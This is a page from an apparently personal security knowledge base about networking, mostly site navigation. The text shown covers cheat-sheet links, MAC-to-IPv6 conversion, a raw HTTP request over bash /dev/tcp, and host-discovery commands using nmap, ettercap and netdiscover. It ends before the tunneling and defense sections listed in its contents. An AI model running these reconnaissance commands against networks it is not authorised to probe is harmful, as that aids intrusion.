



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Network - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#quick-reference" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href=".." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Network
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href=".." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href=".." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../apt/" title="APT" class="md-nav__link">
      APT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../books/" title="Books" class="md-nav__link">
      Books
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases-sqlserver/" title="Databases - SqlServer" class="md-nav__link">
      Databases - SqlServer
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../dfir/" title="DFIR" class="md-nav__link">
      DFIR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam-kerberos/" title="IAM - Kerberos" class="md-nav__link">
      IAM - Kerberos
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../iam/" title="IAM" class="md-nav__link">
      IAM
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Network
      </label>
    
    <a href="./" title="Network" class="md-nav__link md-nav__link--active">
      Network
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-security-monitoring" class="md-nav__link">
    Network Security Monitoring
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    Port Scanning
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-forwarding-tunneling" class="md-nav__link">
    Port Forwarding / Tunneling
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-port-forwarding" class="md-nav__link">
    Local Port Forwarding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-port-forwarding" class="md-nav__link">
    Remote Port Forwarding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-port-forwarding" class="md-nav__link">
    Dynamic port forwarding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#quick-reference_1" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#techniques" class="md-nav__link">
    Techniques
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-fronting" class="md-nav__link">
    Domain Fronting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#traffic-analysis" class="md-nav__link">
    Traffic Analysis
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tshark" class="md-nav__link">
    TSHark
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ipv6" class="md-nav__link">
    IPV6
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idsips-suricata" class="md-nav__link">
    IDS/IPS - Suricata
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../non-security/" title="Z Non Security" class="md-nav__link">
      Z Non Security
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../osint/" title="OSINT" class="md-nav__link">
      OSINT
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../ports-and-protocols/" title="Ports and protocols" class="md-nav__link">
      Ports and protocols
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../practice/" title="Practice Environments" class="md-nav__link">
      Practice Environments
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../red-blue-team/" title="Red blue team" class="md-nav__link">
      Red blue team
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../rf-and-sdr/" title="RF and SDR" class="md-nav__link">
      RF and SDR
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../social-engineering/" title="Social engineering" class="md-nav__link">
      Social engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../wifi/" title="WiFi & Wireless" class="md-nav__link">
      WiFi & Wireless
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35" type="checkbox" id="nav-35">
    
    <label class="md-nav__link" for="nav-35">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-35">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/cissp/" title="CISSP" class="md-nav__link">
      CISSP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/osce/" title="OSCE" class="md-nav__link">
      OSCE
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oswe/" title="Oswe" class="md-nav__link">
      Oswe
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4" type="checkbox" id="nav-35-4">
    
    <label class="md-nav__link" for="nav-35-4">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-35-4">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4-9" type="checkbox" id="nav-35-4-9">
    
    <label class="md-nav__link" for="nav-35-4-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-35-4-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-35-4-9-10" type="checkbox" id="nav-35-4-9-10">
    
    <label class="md-nav__link" for="nav-35-4-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-35-4-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-36" type="checkbox" id="nav-36">
    
    <label class="md-nav__link" for="nav-36">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-36">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/azuer-o360/" title="Azuer o360" class="md-nav__link">
      Azuer o360
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../cloud/general/" title="General" class="md-nav__link">
      General
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-37" type="checkbox" id="nav-37">
    
    <label class="md-nav__link" for="nav-37">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-37">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/CKAD/" title="CKAD" class="md-nav__link">
      CKAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/istio/" title="Istio" class="md-nav__link">
      Istio
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../devops/kubernetes/" title="Kubernetes" class="md-nav__link">
      Kubernetes
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-38" type="checkbox" id="nav-38">
    
    <label class="md-nav__link" for="nav-38">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-38">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/powershell/" title="Powershell" class="md-nav__link">
      Powershell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows-privilege-escalation/" title="Windows Privilege Escalation" class="md-nav__link">
      Windows Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../windows/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#quick-reference" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#network-security-monitoring" class="md-nav__link">
    Network Security Monitoring
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-scanning" class="md-nav__link">
    Port Scanning
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#port-forwarding-tunneling" class="md-nav__link">
    Port Forwarding / Tunneling
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#local-port-forwarding" class="md-nav__link">
    Local Port Forwarding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-port-forwarding" class="md-nav__link">
    Remote Port Forwarding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-port-forwarding" class="md-nav__link">
    Dynamic port forwarding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#quick-reference_1" class="md-nav__link">
    Quick Reference
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tools" class="md-nav__link">
    Tools
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#techniques" class="md-nav__link">
    Techniques
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#domain-fronting" class="md-nav__link">
    Domain Fronting
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#traffic-analysis" class="md-nav__link">
    Traffic Analysis
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tshark" class="md-nav__link">
    TSHark
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defense" class="md-nav__link">
    Defense
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ipv6" class="md-nav__link">
    IPV6
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idsips-suricata" class="md-nav__link">
    IDS/IPS - Suricata
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>Network</h1>
                
                <h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
<p><strong>Cheat Sheets</strong></p>
<ul>
<li>Nmap: <a href="https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf">https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf</a></li>
<li>Wireshark: <a href="https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf">https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf</a></li>
<li>TcpDump: <a href="https://packetlife.net/media/library/12/tcpdump.pdf">https://packetlife.net/media/library/12/tcpdump.pdf</a></li>
<li>Netcat: <a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf</a></li>
<li>Ncat: <a href="https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533">https://medium.com/@pentest_it/ncat-cheatsheet-ddc5f07d8533</a></li>
<li>Scapy: <a href="https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf">https://blogs.sans.org/pen-testing/files/2016/04/ScapyCheatSheet_v0.2.pdf</a></li>
</ul>
<p><strong>Quick Reference</strong></p>
<ul>
<li><a href="https://www.putorius.net/find-public-ip-address-linux-command-line.html">How to Find Your Public IP Address on Linux Command Line</a>: <code class="codehilite"><span class="n">curl</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ipaddr</span><span class="p">.</span><span class="n">pub</span></code></li>
<li>MAC to IPv6: <a href="https://ben.akrin.com/?p=1347">https://ben.akrin.com/?p=1347</a><ul>
<li>take the mac address: for example <code class="codehilite"><span class="mi">52</span><span class="o">:</span><span class="mi">74</span><span class="o">:</span><span class="n">f2</span><span class="o">:</span><span class="n">b1</span><span class="o">:</span><span class="n">a8</span><span class="o">:</span><span class="mi">7</span><span class="n">f</span></code></li>
<li>throw <code class="codehilite"><span class="n">ff</span><span class="o">:</span><span class="n">fe</span></code> in the middle: 52:74:f2:<code class="codehilite"><span class="n">ff</span><span class="o">:</span><span class="n">fe</span></code>:b1:a8:7f</li>
<li>reformat to IPv6 notation <code class="codehilite"><span class="mi">5274</span><span class="o">:</span><span class="n">f2ff</span><span class="o">:</span><span class="n">feb1</span><span class="o">:</span><span class="n">a87f</span></code></li>
<li>convert the first octet from hexadecimal to binary: <code class="codehilite"><span class="mi">52</span></code> -&gt; <code class="codehilite"><span class="mi">01010010</span></code></li>
<li>invert the bit at index 6 (counting from 0): <code class="codehilite"><span class="mi">01010010</span></code> -&gt; <code class="codehilite"><span class="mi">01010000</span></code></li>
<li>convert octet back to hexadecimal: <code class="codehilite"><span class="mi">01010000</span></code> -&gt; <code class="codehilite"><span class="mi">50</span></code></li>
<li>replace first octet with newly calculated one: <code class="codehilite"><span class="mi">5074</span><span class="o">:</span><span class="n">f2ff</span><span class="o">:</span><span class="n">feb1</span><span class="o">:</span><span class="n">a87f</span></code></li>
<li>prepend the link-local prefix: <code class="codehilite"><span class="n">fe80</span><span class="p">::</span><span class="mi">5074</span><span class="p">:</span><span class="n">f2ff</span><span class="p">:</span><span class="n">feb1</span><span class="p">:</span><span class="n">a87f</span></code></li>
<li><a href="https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6">https://stackoverflow.com/questions/27693120/convert-from-mac-to-ipv6</a>  <br />
  <div class="codehilite"><pre><span></span><span class="n">format_eui_64</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">local</span> <span class="n">macaddr</span><span class="o">=</span><span class="s">&quot;$1&quot;</span>
    <span class="n">printf</span> <span class="s">&quot;%02x%s&quot;</span> <span class="err">$</span><span class="p">((</span> <span class="mi">16</span><span class="err">#$</span><span class="p">{</span><span class="nl">macaddr</span><span class="p">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">2</span><span class="p">}</span> <span class="o">^</span> <span class="mi">2</span><span class="err">#</span><span class="mo">00000010</span> <span class="p">))</span> <span class="s">&quot;${macaddr:2}&quot;</span> \
        <span class="o">|</span> <span class="n">sed</span> <span class="o">-</span><span class="n">E</span> <span class="o">-</span><span class="n">e</span> <span class="err">&#39;</span><span class="n">s</span><span class="o">/</span><span class="p">([</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="n">a</span><span class="o">-</span><span class="n">zA</span><span class="o">-</span><span class="n">Z</span><span class="p">]{</span><span class="mi">2</span><span class="p">})</span><span class="err">*/</span><span class="mi">0</span><span class="n">x</span><span class="err">\</span><span class="mi">0</span><span class="o">|/</span><span class="n">g</span><span class="err">&#39;</span> \
        <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="err">&#39;</span><span class="o">:</span><span class="err">\</span><span class="n">n</span><span class="err">&#39;</span> \
        <span class="o">|</span> <span class="n">xargs</span> <span class="o">-</span><span class="n">d</span> <span class="sc">&#39;|&#39;</span> \
        <span class="n">printf</span> <span class="s">&quot;%02x%02x:%02xff:fe%02x:%02x%02x&quot;</span>
<span class="p">}</span>
</pre></div></li>
</ul>
</li>
<li>HTTP Request with <code class="codehilite"><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span></code>
    <div class="codehilite"><pre><span></span><span class="nb">exec</span> <span class="m">3</span>&lt;&gt;/dev/tcp/<span class="o">(</span>INTERNAL IP ADDRESS<span class="o">)</span>/80
<span class="nb">echo</span> -e <span class="s2">&quot;GET / HTTP/1.1\r\nHost: (INTERNAL IP ADDRESS)\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (X11;Linux x86_64...) Gecko/20100101 Firefox/60.0\r\n\r\n&quot;</span> &gt;<span class="p">&amp;</span><span class="m">3</span>
cat &lt;<span class="p">&amp;</span><span class="m">3</span>
</pre></div></li>
<li>TCP Flag Key: <a href="http://rapid.web.unc.edu/resources/tcp-flag-key/">http://rapid.web.unc.edu/resources/tcp-flag-key/</a></li>
<li>Network Discovery
    <div class="codehilite"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sn</span> <span class="o">&lt;</span><span class="n">target</span> <span class="n">addresses</span><span class="o">&gt;</span> <span class="o">#</span> <span class="n">disable</span> <span class="n">port</span> <span class="n">scanning</span> <span class="p">(</span><span class="n">keep</span> <span class="n">discovery</span> <span class="n">enabled</span><span class="p">)</span>
<span class="n">nmap</span> <span class="o">-</span><span class="n">sP</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="o">-</span><span class="mi">255</span>
<span class="n">ettercap</span> <span class="o">-</span><span class="n">T</span> <span class="o">-</span><span class="n">i</span> <span class="n">eth0</span> <span class="o">///</span>
<span class="n">netdiscover</span> <span class="o">-</span><span class="n">i</span> <span class="n">ens33</span>
</pre></div></li>
<li>IPv6 
    <div class="codehilite"><pre><span></span><span class="n">ping</span> <span class="p">(</span><span class="n">TARGET</span> <span class="n">IP</span> <span class="n">ADDRESS</span><span class="p">)</span>
<span class="n">arp</span> <span class="o">-</span><span class="n">a</span>
</pre></div></li>
